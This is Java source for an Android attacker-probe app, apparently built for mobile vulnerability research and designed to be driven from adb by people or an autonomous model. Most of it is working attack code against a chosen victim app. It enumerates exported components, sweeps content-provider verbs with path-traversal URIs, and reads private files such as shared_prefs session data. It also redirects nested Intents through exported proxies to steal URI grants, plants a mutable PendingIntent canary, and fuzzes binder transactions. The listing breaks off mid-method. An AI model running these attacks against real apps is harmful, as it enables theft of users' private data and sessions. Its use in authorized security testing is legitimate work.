package com.sanehunters.probe;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.text.method.ScrollingMovementMethod;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Locale;

/**
 * probe — the zero-permission test application used to establish attacker model AM-03.
 *
 * WHY: `adb shell am start` runs as the shell UID, which holds far more privilege than any installed
 * third-party app. A result observed only through adb is discovery; the same result reproduced from this
 * app (whose manifest declares no permissions) is the AM-03 proof the report needs.
 *
 * TWO WAYS TO DRIVE IT
 *   1. Buttons (for the PoC video — the log pane is the narration; docs/04).
 *   2. Headless, from adb, so an autonomous model can run and read it. ALWAYS pass -S: without it a second
 *      `am start` while the activity is alive is "delivered to top" and runs nothing. Scripted loops give
 *      every fire its own action (-a probe.fire.$N) so no two fires are ever collapsed. The whole command goes
 *      in double quotes and every value in single quotes: adb shell re-parses the line on the DEVICE, where an
 *      unquoted `;` (the extras separator), `&`, `?` or `->` is a separator, a glob or a redirect.
 *        adb shell "am start -S -n com.sanehunters.probe/.MainActivity \
 *          --es run baseline,enumerate,provider,read,redirect,deeplink \
 *          --es victim com.target.app --es authority com.target.app.fileprovider \
 *          --es uri 'content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml' \
 *          --es deeplink 'targetapp://open?url=https://example.test/' \
 *          --es proxy com.target.app.ProxyActivity --es target com.target.app.InternalActivity \
 *          --es extra intent --es mode loot --ez finish false"
 *        adb logcat -s PROBE:V        # every result is one line:  PROBE|<step>|<key>=<value>
 *        adb pull /sdcard/Android/data/com.sanehunters.probe/files/ $E/logs/probe/   # the file mirror
 *
 * STEPS (all selected with --es run a,b,c; every extra is listed in README.md):
 *   baseline enumerate provider read redirect deeplink   — the original six
 *   start      explicit component (or implicit action) with TYPED extras, optional startActivityForResult
 *   broadcast  sendBroadcast / sendOrderedBroadcast, explicit or implicit, with or without a receiver permission
 *   bind       bindService + transact sweep with an interface token and an optional callback binder, plus DUMP
 *   getservice android.os.ServiceManager.getService reachability (null vs IBinder + descriptor)
 *   sniff      runtime-registered receiver for implicit broadcasts, ended by a positive-control broadcast
 *   picanary   hand the victim a PendingIntent to LootActivity and record whether it was ever sent
 *
 * LOG CONTRACT: print the RAW platform return value with its meaning in parentheses; never paraphrase.
 * Steps print PROBE|<step>|... to logcat, to the on-screen pane AND to the file mirror (Probe.java).
 * Candidates, never findings.
 */
public class MainActivity extends Activity {
    static final String TAG = Probe.TAG;
    static final int RC_START = 0x5A4E;

    // Defaults — overridden by intent extras in headless mode. Edit for a button-driven session.
    String victim = BuildConfig.VICTIM;
    String finding = "F-001";
    String klass = "exported provider -> private file read";
    String precond = null;      // measured at ready unless --es precond overrides it
    String proxy = null;        // victim's exported component that forwards an Intent it receives
    String target = null;       // victim's non-exported component (mode=internal)
    String authority = null;    // provider authority under test
    String uri = null;          // content:// URI the read step opens
    String deeplink = null;     // VIEW URI the deeplink step fires
    String extraKey = "intent"; // extra name the proxy reads the nested Intent from
    String mode = "loot";       // loot: nested Intent targets our LootActivity (captures a forwarded grant)
                                // internal: nested Intent targets the victim's non-exported component
    // start / broadcast / bind / getservice / sniff / picanary
    String component = null;    // pkg/cls, pkg/.cls or .cls (resolved against victim)
    String action = null;       // implicit action (start, broadcast) or sniffed actions (comma list)
    String category = null;     // comma list of categories for start/broadcast
    String extras = null;       // typed-extras grammar, see putTyped()
    String data = null;         // data URI for start/broadcast
    String receiverPerm = null; // sendBroadcast(intent, receiverPermission)
    String descriptor = null;   // interface token written before every transact
    String codes = null;        // transaction codes: "1-64" or "1,3,7" (bind)
    String services = null;     // ServiceManager names, comma list (getservice)
    String verbs = null;        // provider verbs, comma list; default = the full matrix
    String methods = null;      // provider call() method names, comma list
    String paths = null;        // provider path suffixes, comma list; default = the five classic ones
    String control = "content://settings/secure"; // world-readable positive control for the provider step
    String piKey = "pendingIntent"; // extra name the PendingIntent canary travels under
    boolean browsable = true;   // start: add CATEGORY_BROWSABLE (false = non-BROWSABLE implicit VIEW)
    boolean forResult = false;  // start: startActivityForResult and dump the result
    boolean ordered = false;    // broadcast: sendOrderedBroadcast with a result receiver
    boolean callback = false;   // bind: write a Binder of ours into each transaction
    boolean dump = true;        // bind: try DUMP_TRANSACTION through a pipe
    int flags = 0;              // extra Intent flags (start/broadcast)
    int window = 60;            // sniff: seconds the receiver stays registered

    TextView log; ScrollView scroll;
    final Handler ui = new Handler(Looper.getMainLooper());
    int pendingAsync = 0; boolean finishWhenDone = false;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        log = findViewById(R.id.log);
        scroll = findViewById(R.id.scroll);
        log.setMovementMethod(new ScrollingMovementMethod());
        LinearLayout bar = findViewById(R.id.buttons);
        btn(bar, "0) BASELINE — what I am NOT allowed to do", v -> baseline());
        btn(bar, "1) ENUMERATE victim surface", v -> enumerate());
        btn(bar, "2) PROVIDER — the verb matrix, control first", v -> providers());
        btn(bar, "3) READ the URI under test", v -> readUri(uri));
        btn(bar, "4) REDIRECT through the exported proxy", v -> redirect());
        btn(bar, "5) DEEP LINK as a web page would fire it", v -> deeplink());
        btn(bar, "6) START explicit component + typed extras", v -> start());
        btn(bar, "7) BROADCAST / BIND / GETSERVICE / SNIFF (headless extras)", v -> { broadcast(); bind(); getservice(); });
        launch(getIntent(), "onCreate");
    }

    /** With launchMode=singleTop a live probe receives later `am start` calls here instead of being skipped. */
    @Override protected void onNewIntent(Intent i) {
        super.onNewIntent(i);
        setIntent(i);
        launch(i, "onNewIntent");
    }

    void launch(Intent i, String how) {
        readExtras(i);
        ready(how);
        ((TextView) findViewById(R.id.header)).setText(finding + " — " + klass + "\n" + precond + "\nvictim=" + victim);
        String run = i == null ? null : i.getStringExtra("run");
        if (run != null) {
            for (String step : run.split(",")) runStep(step.trim().toLowerCase(Locale.ROOT));
            finishWhenDone = i.getBooleanExtra("finish", false);
            maybeFinish();
        }
    }

    // ── ready: every precondition MEASURED, never asserted (docs/04 Beat 3/4) ──
    void ready(String how) {
        String[] req = null; int tsdk = getApplicationInfo().targetSdkVersion;
        try { req = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS).requestedPermissions; }
        catch (Throwable t) { p("ready", "requestedPermissions_failed=" + t); }
        String perms = (req == null || req.length == 0) ? "[]" : Arrays.toString(req);
        String secure = "unknown(api<23)";
        if (Build.VERSION.SDK_INT >= 23) {
            try { secure = String.valueOf(((KeyguardManager) getSystemService(KEYGUARD_SERVICE)).isDeviceSecure()); }
            catch (Throwable t) { secure = "failed:" + t.getClass().getSimpleName(); }
        }
        if (precond == null) precond = "requestedPermissions=" + perms + " · targetSdk " + tsdk + " · api " + Build.VERSION.SDK_INT;
        p("ready", "launch=" + how, "requestedPermissions=" + perms + " (AM-03 holds only while this is [])",
          "targetSdk=" + tsdk, "api=" + Build.VERSION.SDK_INT, "uid=" + android.os.Process.myUid(),
          "deviceSecure=" + secure + " (docs/03 §7 lockscreen check)", "queries=" + BuildConfig.VICTIM + " (baked <queries> entry)",
          "mirror=" + Probe.file(this));
    }

    void readExtras(Intent i) {
        if (i == null) return;
        victim    = opt(i, "victim", victim);
        finding   = opt(i, "finding", finding);
        klass     = opt(i, "class", klass);
        precond   = opt(i, "precond", precond);
        proxy     = opt(i, "proxy", proxy);
        target    = opt(i, "target", target);
        authority = opt(i, "authority", authority);
        uri       = opt(i, "uri", uri);
        deeplink  = opt(i, "deeplink", deeplink);
        extraKey  = opt(i, "extra", extraKey);
        mode      = opt(i, "mode", mode);
        component = opt(i, "component", component);
        action    = opt(i, "action", action);
        if (action == null) action = opt(i, "actions", null);
        category  = opt(i, "category", category);
        extras    = opt(i, "extras", extras);
        data      = opt(i, "data", data);
        receiverPerm = opt(i, "receiverperm", receiverPerm);
        descriptor = opt(i, "descriptor", descriptor);
        codes     = opt(i, "codes", codes);
        services  = opt(i, "services", services);
        verbs     = opt(i, "verbs", verbs);
        methods   = opt(i, "methods", methods);
        paths     = opt(i, "paths", paths);
        control   = opt(i, "control", control);
        piKey     = opt(i, "pikey", piKey);
        browsable = i.getBooleanExtra("browsable", browsable);
        forResult = i.getBooleanExtra("forresult", forResult);
        ordered   = i.getBooleanExtra("ordered", ordered);
        callback  = i.getBooleanExtra("callback", callback);
        dump      = i.getBooleanExtra("dump", dump);
        flags     = i.getIntExtra("flags", flags);
        window    = i.getIntExtra("window", window);
    }
    static String opt(Intent i, String k, String d) { String v = i.getStringExtra(k); return v == null || v.isEmpty() ? d : v; }

    void runStep(String s) {
        switch (s) {
            case "baseline": baseline(); break;
            case "enumerate": enumerate(); break;
            case "provider": providers(); break;
            case "read": readUri(uri); break;
            case "redirect": redirect(); break;
            case "deeplink": deeplink(); break;
            case "start": start(); break;
            case "broadcast": broadcast(); break;
            case "bind": bind(); break;
            case "getservice": getservice(); break;
            case "sniff": sniff(); break;
            case "picanary": picanary(); break;
            default: p("error", "unknown_step=" + s);
        }
    }

    // ── 0 · Beat 4 of the evidence standard: the negative control, stated by the app itself ──
    void baseline() {
        String[] req = null;
        try { req = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS).requestedPermissions; } catch (Throwable ignored) {}
        p("baseline", "requestedPermissions=" + (req == null || req.length == 0 ? "[]" : Arrays.toString(req)), "uid=" + android.os.Process.myUid());
        if (uri == null) { p("baseline", "uri=UNSET", "note=pass --es uri to test a direct read"); return; }
        try {
            int r = checkCallingOrSelfUriPermission(Uri.parse(uri), Intent.FLAG_GRANT_READ_URI_PERMISSION);
            p("baseline", "checkUriPermission=" + r + " (0=GRANTED, -1=DENIED)");
        } catch (Throwable t) { p("baseline", "checkUriPermission_threw=" + t); }
        p("baseline", "direct_read=attempt (expected to fail if the control works)");
        readUri(uri);
    }

    // ── 1 · the victim's surface as an unprivileged UID actually sees it ──
    void enumerate() {
        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(victim, PackageManager.GET_ACTIVITIES | PackageManager.GET_PROVIDERS
                    | PackageManager.GET_RECEIVERS | PackageManager.GET_SERVICES);
            p("enumerate", "versionName=" + pi.versionName, "versionCode=" + pi.versionCode, "targetSdk=" + pi.applicationInfo.targetSdkVersion);
            if (pi.activities != null) for (ActivityInfo a : pi.activities)
                if (a.exported) p("enumerate", "activity=" + a.name, "permission=" + (a.permission == null ? "NONE" : a.permission));
            if (pi.providers != null) for (ProviderInfo x : pi.providers)
                if (x.exported) p("enumerate", "provider=" + x.authority, "read=" + x.readPermission, "write=" + x.writePermission, "grantUri=" + x.grantUriPermissions);
            if (pi.receivers != null) for (ActivityInfo a : pi.receivers)
                if (a.exported) p("enumerate", "receiver=" + a.name, "permission=" + (a.permission == null ? "NONE" : a.permission));
            if (pi.services != null) for (ServiceInfo s : pi.services)
                if (s.exported) p("enumerate", "service=" + s.name, "permission=" + (s.permission == null ? "NONE" : s.permission));
        } catch (Throwable t) {
            p("enumerate", "getPackageInfo_failed=" + t,
              "note=on API 30+ the <queries> element must name the victim (built with ./build.sh --victim " + victim + "); baked=" + BuildConfig.VICTIM
              + "; an empty result here is a package-visibility artefact, not a negative");
        }
    }

    // ── 2 · the provider verb matrix: a positive control first, then every verb as its own question ──
    static final String ALL_VERBS = "query,query-projection,query-selection,insert,update,delete,getType,openFile,openFileDescriptor,"
            + "openAssetFile,openTypedAssetFile,getStreamTypes,bulkInsert,applyBatch,canonicalize,uncanonicalize,refresh,call";
    void providers() {
        if (authority == null) { p("provider", "authority=UNSET"); return; }
        ContentResolver cr = getContentResolver();
        // Positive control: proves this step can produce a positive before any zero is read as a negative (D26-063).
        if (control != null && !control.isEmpty()) {
            try (Cursor c = cr.query(Uri.parse(control), null, null, null, null)) {
                p("provider", "control=" + control, "query=" + (c == null ? "null_cursor" : c.getCount() + "_rows") + " (POSITIVE CONTROL: the step works)");
            } catch (Throwable t) { p("provider", "control=" + control, "query_failed=" + t, "note=control failed: every zero below is UNVERIFIED"); }
        }
        String[] vs = (verbs == null ? ALL_VERBS : verbs).split(",");
        String[] ps = (paths == null ? new String[]{"", "/", "/1", "/..", "/..%2f..%2fshared_prefs"} : paths.split(","));
        String[] ms = (methods == null ? new String[]{"test", "getInfo", "get", "init"} : methods.split(","));
        for (String v0 : vs) {
            String v = v0.trim();
            if (v.equals("call")) {
                for (String m : ms) {
                    try {
                        Bundle r = cr.call(Uri.parse("content://" + authority), m.trim(), null, null);
                        p("provider", "call=" + m, "result=" + (r == null ? "null" : "Bundle" + r.keySet() + " (RETURNED candidate)"));
                    } catch (Throwable t) { p("provider", "call=" + m, "result=" + t); }
                }
                continue;
            }
            for (String path : ps) {
                Uri u = Uri.parse("content://" + authority + path.trim());
                try { p("provider", "verb=" + v, "uri=" + u, "result=" + verb(cr, v, u)); }
                catch (Throwable t) { p("provider", "verb=" + v, "uri=" + u, "result=" + t); }  // D07-010: class AND message, verbatim
            }
        }
    }
    String verb(ContentResolver cr, String v, Uri u) throws Exception {
        ContentValues cv = new ContentValues(); cv.put("probe", "canary-" + System.currentTimeMillis());
        switch (v) {
            case "query": try (Cursor c = cr.query(u, null, null, null, null)) { return rows(c); }
            case "query-projection": try (Cursor c = cr.query(u, new String[]{"*"}, null, null, null)) { return rows(c); }
            case "query-selection": try (Cursor c = cr.query(u, null, "1=1", null, null)) { return rows(c) + " (selection accepted)"; }
            case "insert": return String.valueOf(cr.insert(u, cv)) + " (WRITE candidate if non-null)";
            case "update": return cr.update(u, cv, null, null) + "_rows (WRITE candidate if >0)";
            case "delete": return cr.delete(u, "probe=?", new String[]{"never-matches"}) + "_rows (DELETE reachable; selection chosen to match nothing)";
            case "getType": return String.valueOf(cr.getType(u));
            case "openFile": case "openFileDescriptor": try (ParcelFileDescriptor f = cr.openFileDescriptor(u, "r")) { return f == null ? "null" : "fd size=" + f.getStatSize() + " (READ candidate)"; }
            case "openAssetFile": try (AssetFileDescriptor f = cr.openAssetFileDescriptor(u, "r")) { return f == null ? "null" : "afd len=" + f.getLength() + " (READ candidate)"; }
            case "openTypedAssetFile": try (AssetFileDescriptor f = cr.openTypedAssetFileDescriptor(u, "*/*", null)) { return f == null ? "null" : "afd len=" + f.getLength() + " (READ candidate)"; }
            case "getStreamTypes": return Arrays.toString(cr.getStreamTypes(u, "*/*"));
            case "bulkInsert": return cr.bulkInsert(u, new ContentValues[]{cv}) + "_rows (WRITE candidate if >0)";
            case "applyBatch": {
                ArrayList<ContentProviderOperation> ops = new ArrayList<>();
                ops.add(ContentProviderOperation.newAssertQuery(u).withExpectedCount(0).build());
                return Arrays.toString(cr.applyBatch(authority, ops)) + " (applyBatch reachable)";
            }
            case "canonicalize": return String.valueOf(cr.canonicalize(u));
            case "uncanonicalize": return String.valueOf(cr.uncanonicalize(u));
            case "refresh": return Build.VERSION.SDK_INT >= 26 ? String.valueOf(cr.refresh(u, null, null)) : "unsupported(api<26)";
            default: return "unknown_verb";
        }
    }
    static String rows(Cursor c) { return c == null ? "null_cursor" : c.getCount() + "_rows cols=" + Arrays.toString(c.getColumnNames()) + " (READABLE candidate)"; }

    // ── 3 · the read primitive, with byte count ──
    void readUri(String target) {
        if (target == null) { p("read", "uri=UNSET"); return; }
        ContentResolver cr = getContentResolver();
        try (InputStream in = cr.openInputStream(Uri.parse(target))) {
            if (in == null) { p("read", "uri=" + target, "openInputStream=null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            String s = bo.toString();
            p("read", "uri=" + target, "bytes=" + total + " (READ candidate; declared permissions NONE)");
            p("read", "head=" + (s.length() > 400 ? s.substring(0, 400) + "..." : s).replace('\n', ' '));
        } catch (Throwable t) {
            p("read", "uri=" + target, "openInputStream=" + t);
        }
    }

    // ── 4 · nested Intent through the victim's exported proxy ──
    // mode=loot     the nested Intent targets OUR LootActivity carrying the victim's content URI and grant flags;
    //               if the proxy forwards it, the grant is minted by the victim (the confused deputy) and
    //               LootActivity records what it can now read. This is the shape that establishes the primitive.
    // mode=internal the nested Intent targets the victim's own non-exported component (reachability proof only).
    void redirect() {
        if (proxy == null) { p("redirect", "proxy=UNSET", "note=pass --es proxy <victim exported component>"); return; }
        Intent inner = new Intent();
        if ("internal".equals(mode)) {
            if (target == null) { p("redirect", "target=UNSET for mode=internal"); return; }
            inner.setComponent(comp(target));
        } else {
            inner.setClassName(getPackageName(), LootActivity.class.getName());
        }
        if (uri != null) inner.setData(Uri.parse(uri));
        inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_ACTIVITY_NEW_TASK);
        if (extras != null) putTyped(inner, extras);
        Intent outer = new Intent();
        outer.setComponent(comp(proxy));
        outer.putExtra(extraKey, inner);
        outer.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        p("redirect", "mode=" + mode, "proxy=" + proxy, "extra=" + extraKey, "inner=" + inner.getComponent().flattenToShortString(), "data=" + uri);
        try { startActivity(outer); p("redirect", "startActivity=sent", "next=watch logcat PROBE|loot"); }
        catch (Throwable t) { p("redirect", "startActivity_failed=" + t); }
    }

    // ── 5 · fire the deep link exactly as a web page would ──
    void deeplink() {
        if (deeplink == null) { p("deeplink", "uri=UNSET"); return; }
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(deeplink));
        i.addCategory(Intent.CATEGORY_BROWSABLE);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try { startActivity(i); p("deeplink", "uri=" + deeplink, "startActivity=sent", "next=adb shell dumpsys activity activities | grep -m1 topResumedActivity"); }
        catch (Throwable t) { p("deeplink", "uri=" + deeplink, "startActivity_failed=" + t); }
    }

    // ── 6 · explicit component (or implicit action) with typed extras; optionally for result ──
    void start() {
        Intent i = build("start");
        if (i == null) return;
        if (!forResult) i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            if (forResult) { startActivityForResult(i, RC_START); p("start", "startActivityForResult=sent", "next=PROBE|result"); }
            else { startActivity(i); p("start", "startActivity=sent", "next=adb shell dumpsys activity activities | grep -m1 topResumedActivity"); }
        } catch (Throwable t) { p("start", "startActivity_failed=" + t); }
    }
    @Override protected void onActivityResult(int rc, int code, Intent d) {
        super.onActivityResult(rc, code, d);
        if (rc != RC_START) return;
        p("result", "resultCode=" + code + " (-1=RESULT_OK, 0=RESULT_CANCELED)", "data=" + (d == null ? "null" : d.getData()),
          "flags=0x" + (d == null ? "0" : Integer.toHexString(d.getFlags())));
        if (d == null) return;
        boolean r = (d.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0, w = (d.getFlags() & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0;
        if (d.getData() != null) {
            p("result", "grant_read=" + r, "grant_write=" + w, "note=a grant on the result is minted by the victim (confused deputy)");
            if (r) readUri(d.getData().toString());
        }
        if (d.getClipData() != null) for (int k = 0; k < d.getClipData().getItemCount(); k++) p("result", "clip[" + k + "]=" + d.getClipData().getItemAt(k).getUri());
        if (d.getExtras() != null) for (String k : d.getExtras().keySet()) p("result", "extra=" + k, "value=" + String.valueOf(d.getExtras().get(k)));
    }

    // ── 7 · broadcast, explicit or implicit, with or without a receiver permission ──
    void broadcast() {
        Intent i = build("broadcast");
        if (i == null) return;
        try {
            if (ordered) {
                sendOrderedBroadcast(i, receiverPerm, new BroadcastReceiver() {
                    @Override public void onReceive(Context c, Intent x) {
                        p("broadcast", "orderedResult=" + getResultCode(), "resultData=" + getResultData(),
                          "resultExtras=" + (getResultExtras(false) == null ? "null" : getResultExtras(false).keySet()) + " (a non-default result = a receiver handled it)");
                    }
                }, null, Activity.RESULT_CANCELED, null, null);
                p("broadcast", "sendOrderedBroadcast=sent", "receiverPermission=" + receiverPerm);
            } else {
                if (receiverPerm != null) sendBroadcast(i, receiverPerm); else sendBroadcast(i);
                p("broadcast", "sendBroadcast=sent", "receiverPermission=" + receiverPerm,
                  "note=delivery to a manifest receiver is only visible on the victim side (its logcat / a Frida hook); no exception here is NOT delivery");
            }
        } catch (Throwable t) { p("broadcast", "send_failed=" + t); }
    }

    // ── 8 · bindService + transact sweep ──
    void bind() {
        if (component == null) { p("bind", "component=UNSET", "note=pass --es component pkg/cls [--es descriptor <iface>] [--es codes 1-64] [--ez callback true]"); return; }
        Intent i = new Intent(); i.setComponent(comp(component)); if (action != null) i.setAction(action); if (extras != null) putTyped(i, extras);
        async();
        ServiceConnection conn = new ServiceConnection() {
            @Override public void onServiceConnected(ComponentName n, IBinder b) {
                String desc = null;
                try { desc = b.getInterfaceDescriptor(); } catch (Throwable t) { desc = "failed:" + t; }
                p("bind", "connected=" + n.flattenToShortString(), "binder=" + b.getClass().getName(), "descriptor=" + desc, "ping=" + b.pingBinder() + " (BIND candidate: the service accepted a zero-permission caller)");
                final String token = descriptor != null ? descriptor : (desc != null && !desc.startsWith("failed") ? desc : null);
                final IBinder binder = b;
                new Thread(() -> { transactSweep(binder, token); if (dump) dumpBinder(binder); unbindQuietly(this); done(); }, "probe-bind").start();
            }
            @Override public void onServiceDisconnected(ComponentName n) { p("bind", "disconnected=" + n.flattenToShortString()); }
            @Override public void onBindingDied(ComponentName n) { p("bind", "bindingDied=" + n.flattenToShortString()); done(); }
            @Override public void onNullBinding(ComponentName n) { p("bind", "nullBinding=" + n.flattenToShortString() + " (onBind returned null: reachable, no interface)"); unbindQuietly(this); done(); }
        };
        try {
            boolean ok = bindService(i, conn, Context.BIND_AUTO_CREATE);
            p("bind", "bindService=" + ok + " (true=service found and binding started; false=not found/not exported)");
            if (!ok) done();
        } catch (Throwable t) { p("bind", "bindService_failed=" + t); done(); }
    }
    void transactSweep(IBinder b, String token) {
        if (codes == null) { p("bind", "codes=UNSET (no transact sweep; pass --es codes 1-64)"); return; }
        for (int code : parseCodes(codes)) {
            Parcel d = Parcel.obtain(), r = Parcel.obtain();
            try {
                if (token != null) d.writeInterfaceToken(token);
                if (callback) d.writeStrongBinder(new Binder() {
                    @Override protected boolean onTransact(int c, Parcel in, Parcel out, int f) {
                        p("bind", "callback_transact=" + c, "bytes=" + in.dataAvail() + " (the service called OUR binder back)"); return true;
                    }
                });
                if (extras != null) for (String e : extras.split(";")) writeTyped(d, e);
                boolean ok = b.transact(code, d, r, 0);
                r.setDataPosition(0);
                String ex = null; try { r.readException(); } catch (Throwable t) { ex = t.toString(); }
                p("bind", "transact=" + code, "token=" + token, "returned=" + ok + " (false=code unknown to onTransact)", "replyBytes=" + r.dataSize(), "exception=" + ex);
            } catch (Throwable t) { p("bind", "transact=" + code, "token=" + token, "threw=" + t); }
            finally { d.recycle(); r.recycle(); }
        }
    }
    void dumpBinder(IBinder b) {
        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            final ParcelFileDescriptor rd = pipe[0];
            Thread reader = new Thread(() -> {
                try (FileInputStream in = new FileInputStream(rd.getFileDescriptor())) {
                    byte[] buf = new byte[4096]; int n, total = 0; StringBuilder sb = new StringBuilder();
                    while ((n = in.read(buf)) > 0) { total += n; if (sb.length() < 400) sb.append(new String(buf, 0, n)); }
                    p("bind", "dump_bytes=" + total, "head=" + sb.toString().replace('\n', ' '));
                } catch (Throwable t) { p("bind", "dump_read_failed=" + t); }
            }, "probe-dump-reader");
            reader.start();
            try { b.dump(pipe[1].getFileDescriptor(), new String[0]); p("bind", "dump=returned (DUMP_TRANSACTION accepted from a zero-permission caller)"); }
            catch (Throwable t) { p("bind", "dump_failed=" + t); }
            pipe[1].close(); reader.join(5000); rd.close();
        } catch (Throwable t) { p("bind", "dump_setup_failed=" + t); }
    }
    static int[] parseCodes(String s) {
        ArrayList<Integer> out = new ArrayList<>();
        for (String part : s.split(",")) {
            part = part.trim(); if (part.isEmpty()) continue;
            int dash = part.indexOf('-', 1);
            try {
                if (dash > 0) { int a = Integer.decode(part.substring(0, dash).trim()), z = Integer.decode(part.substring(dash + 1).trim()); for (int c = a; c <= z && out.size() < 4096; c++) out.add(c); }
                else out.add(Integer.decode(part));
            } catch (NumberFormatException ignored) {}
        }
        int[] r = new int[out.size()]; for (int k = 0; k < r.length; k++) r[k] = out.get(k); return r;
    }
    void unbindQuietly(ServiceConnection c) { try { unbindService(c); } catch (Throwable ignored) {} }

    // ── 9 · ServiceManager.getService reachability from an app UID ──
    void getservice() {
        if (services == null) { p("getservice", "services=UNSET", "note=pass --es services name1,name2 (names from `adb shell service list`)"); return; }
        for (String s0 : services.split(",")) {
            String s = s0.trim();
            try {
                Class<?> sm = Class.forName("android.os.ServiceManager");
                IBinder b = (IBinder) sm.getMethod("getService", String.class).invoke(null, s);
                if (b == null) { p("getservice", "name=" + s, "binder=null (not registered, or hidden from this UID)"); continue; }
                String desc; try { desc = b.getInterfaceDescriptor(); } catch (Throwable t) { desc = "failed:" + t; }
                p("getservice", "name=" + s, "binder=" + b.getClass().getName(), "descriptor=" + desc, "ping=" + b.pingBinder() + " (REACHABLE candidate: a transact sweep is the next question)");
            } catch (Throwable t) { p("getservice", "name=" + s, "failed=" + t + " (reflection on a hidden API; a blocked reflection is UNVERIFIED, not a negative)"); }
        }
    }

    // ── 10 · runtime-registered receiver: the only way an app on API 26+ sees an implicit broadcast ──
    void sniff() {
        if (action == null) { p("sniff", "actions=UNSET", "note=pass --es actions a.b.C,d.e.F [--ei window 60]"); return; }
        final String[] acts = action.split(",");
        final Sniffer rx = new Sniffer(this);
        IntentFilter f = new IntentFilter(); for (String a : acts) f.addAction(a.trim()); f.setPriority(999);
        if (category != null) for (String c : category.split(",")) f.addCategory(c.trim());
        try {
            if (Build.VERSION.SDK_INT >= 33) registerReceiver(rx, f, Context.RECEIVER_EXPORTED); else registerReceiver(rx, f);
            p("sniff", "registered=" + Arrays.toString(acts), "exported=true", "window=" + window + "s", "note=keep the probe in the foreground: a cached/frozen app has its broadcasts deferred");
        } catch (Throwable t) { p("sniff", "register_failed=" + t); return; }
        async();
        ui.postDelayed(() -> {
            // Positive control: a broadcast to OURSELVES with the first action proves the receiver fires at all.
            Intent ctl = new Intent(acts[0].trim()).setPackage(getPackageName()).putExtra("probe_control", "true");
            try { sendBroadcast(ctl); } catch (Throwable t) { p("sniff", "control_send_failed=" + t); }
            ui.postDelayed(() -> {
                try { unregisterReceiver(rx); } catch (Throwable ignored) {}
                p("sniff", "done", "received=" + rx.received + " (includes the 1 control; control_seen=" + rx.controlSeen + ")",
                  "note=control_seen=false means the instrument never fired: every zero in this window is UNVERIFIED");
                done();
            }, 2000);
        }, window * 1000L);
    }

    // ── 11 · PendingIntent canary: does the victim ever send() a PendingIntent we handed it? ──
    void picanary() {
        if (component == null) { p("picanary", "component=UNSET", "note=pass --es component <victim component> [--es pikey <extra name>] [--es action ...]"); return; }
        Intent loot = new Intent(this, LootActivity.class).putExtra("probe_canary", "pi-" + System.currentTimeMillis());
        int fl = PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= 31 ? PendingIntent.FLAG_MUTABLE : 0);
        PendingIntent pi = PendingIntent.getActivity(this, 0, loot, fl);
        Intent i = new Intent(); i.setComponent(comp(component)); if (action != null) i.setAction(action); i.putExtra(piKey, pi); if (extras != null) putTyped(i, extras);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        p("picanary", "handed=" + i.getComponent().flattenToShortString(), "extra=" + piKey, "mutable=" + (Build.VERSION.SDK_INT >= 31), "next=watch PROBE|loot|extra=probe_canary");
        try { startActivity(i); p("picanary", "startActivity=sent"); }
        catch (Throwable t) { try { sendBroadcast(i); p("picanary", "sendBroadcast=sent (startActivity failed: " + t.getClass().getSimpleName() + ")"); } catch (Throwable t2) { p("picanary", "failed=" + t2); } }
    }

    // ── Intent construction shared by start / broadcast ──
    Intent build(String step) {
        if (component == null && action == null) { p(step, "component=UNSET", "action=UNSET", "note=pass --es component pkg/cls or --es action <implicit action>"); return null; }
        Intent i = new Intent();
        if (component != null) i.setComponent(comp(component));
        if (action != null) i.setAction(action);
        if (data != null) i.setData(Uri.parse(data));
        if (category != null) for (String c : category.split(",")) i.addCategory(c.trim());
        if (browsable && component == null && Intent.ACTION_VIEW.equals(action)) i.addCategory(Intent.CATEGORY_BROWSABLE);
        if (flags != 0) i.addFlags(flags);
        if (extras != null) putTyped(i, extras);
        p(step, "component=" + (i.getComponent() == null ? "implicit" : i.getComponent().flattenToShortString()), "action=" + action, "data=" + data,
          "categories=" + i.getCategories(), "flags=0x" + Integer.toHexString(i.getFlags()), "extras=" + (i.getExtras() == null ? "[]" : i.getExtras().keySet()));
        return i;
    }
    ComponentName comp(String c) {
        if (c.indexOf('/') > 0) return ComponentName.unflattenFromString(c);
